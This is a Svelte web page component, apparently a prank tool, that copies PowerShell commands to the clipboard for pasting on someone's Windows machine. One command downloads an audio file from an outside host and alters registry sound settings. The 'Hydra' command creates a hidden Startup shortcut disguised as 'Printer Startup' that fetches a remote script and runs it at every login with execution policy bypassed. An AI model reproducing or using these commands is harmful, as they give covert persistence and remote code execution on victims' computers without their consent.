<script>
    // @ts-nocheck

    const modules = import.meta.glob("./funnies/*.wav");
    let funnies = [];

    let popupContent = "";

    for (const path in modules) {
        modules[path]().then((m) => {
            console.log(m.default);
            funnies = [...funnies, m.default];
        });
    }

    function copyScript(file) {
        const name = file.split("/")[2];
        const text = `if(-not (Test-Path -Path  \"$env:USERPROFILE\\${name}\")){Invoke-WebRequest -Uri \"https://v.theludde235.se/assets/${name}\" -OutFile \"$env:USERPROFILE\\${name}\";}Set-ItemProperty -Path \"HKCU:\\AppEvents\\Schemes\\Apps\\.Default\\Open\\.Current\" -Name \"(Default)\" -Type \"String\" -Value \"$env:USERPROFILE\\${name}\";`;
        navigator.clipboard.writeText(text);
    }

    function copyPopup(text) {
        navigator.clipboard.writeText(
            `C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noexit -ExecutionPolicy Bypass "Add-Type -AssemblyName System.Windows.Forms;[System.Windows.Forms.MessageBox]::Show('${text}');"`
        );
        if (text.length > 79) {
            alert(
                "There might be problems with the command due to the lenght of the message"
            );
        }
    }

    function copyHydra() {
        navigator.clipboard.writeText(`$WshShell=New-Object -comObject WScript.Shell;$Shortcut=$WshShell.CreateShortcut("$Home\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Printer Startup.lnk");$Shortcut.TargetPath="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";$Shortcut.Arguments='-ExecutionPolicy Bypass -WindowStyle Hidden -NoLogo "(Invoke-Webrequest \\"https://raw.githubusercontent.com/TheLudde235/powershell/main/test/hydra.ps1\\").content | powershell.exe"';$Shortcut.Save();exit;`)
    }

    function clear($event) {
        navigator.clipboard.writeText(`Set-ItemProperty -Path \"HKCU:\\AppEvents\\Schemes\\Apps\\.Default\\Open\\.Current\" -Name \"(Default)\" -Type \"String\" -Value \"\";`);
    }
</script>

<main>
    <div class="info-container">
        <div>
            <a
                href="https://github.com/TheLudde235/svelte-v/blob/master/README.md"
                >What is this?</a
            >
            <a
                href="https://github.com/TheLudde235/svelte-v/blob/master/Manual.md"
                >How do I use it?</a
            >
        </div>
    </div>
    <input
        type="text"
        placeholder="pop-up content (max 79 for popup)"
        id="popup-input"
        bind:value={popupContent}
    />
    <a href="#" on:click={copyPopup(popupContent)}><h1>Copy pop-up (run)</h1></a>
    <a href="#" on:click={copyHydra()} class="script">Hydra</a>

    {#each funnies as funny}
        <div class="funny">
            <p>{funny.split("/")[2]}</p>
            <audio src={funny} controls /> <br />
            <a href="#" on:click={copyScript(funny)} class="sound">
                copy open-program script (ps1)
            </a>
            <hr />
        </div>
    {/each}

    <a href="#" on:click={clear($event)} class="clear">Clear</a>
</main>

<style>
    a {
        color: blue;
    }

    input#popup-input {
        display: flex;
        width: 98%;
        margin: 10px auto;
    }

    .funny {
        margin: 10px;
    }

    h1,
    a {
        margin: 10px;
    }

    a.sound {
        font-size: 20px;
    }

    .info-container {
        display: flex;
    }
    .info-container div {
        margin-left: auto;
    }
</style>
